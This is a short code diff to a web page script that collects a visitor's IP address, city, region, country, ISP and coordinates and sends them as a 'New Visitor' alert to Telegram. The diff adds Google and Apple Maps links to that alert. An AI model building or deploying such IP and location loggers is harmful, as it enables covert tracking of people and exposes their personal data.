@@ -263,6 +263,7 @@
       document.getElementById('appleMap').src = `https://maps.apple.com/?ll=${lat},${lon}&z=14&t=m`;
       document.getElementById('googleMap').src = `https://maps.google.com/maps?q=${lat},${lon}&z=14&output=embed`;
 
+      // Telegram mesajına Apple Maps ve Google Maps linkleri ekle
       const message =
         `📡 Yeni Ziyaretçi\n\n` +
         `🛰️ IP: ${data.ip}\n` +
@@ -271,7 +272,10 @@
         `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
         `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
         `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
-        `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}`;
+        `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}\n\n` +
+        `📌 Harita Bağlantıları:\n` +
+        `🔗 Google Maps: https://www.google.com/maps?q=${lat},${lon}\n` +
+        `🍎 Apple Maps: https://maps.apple.com/?ll=${lat},${lon}`;
 
       const sent = await sendTelegramMessage(message);
       status.textContent = sent ? '✔️ Telegram bildirimi gönderildi.' : '❌ Telegram bildirimi gönderilemedi.';
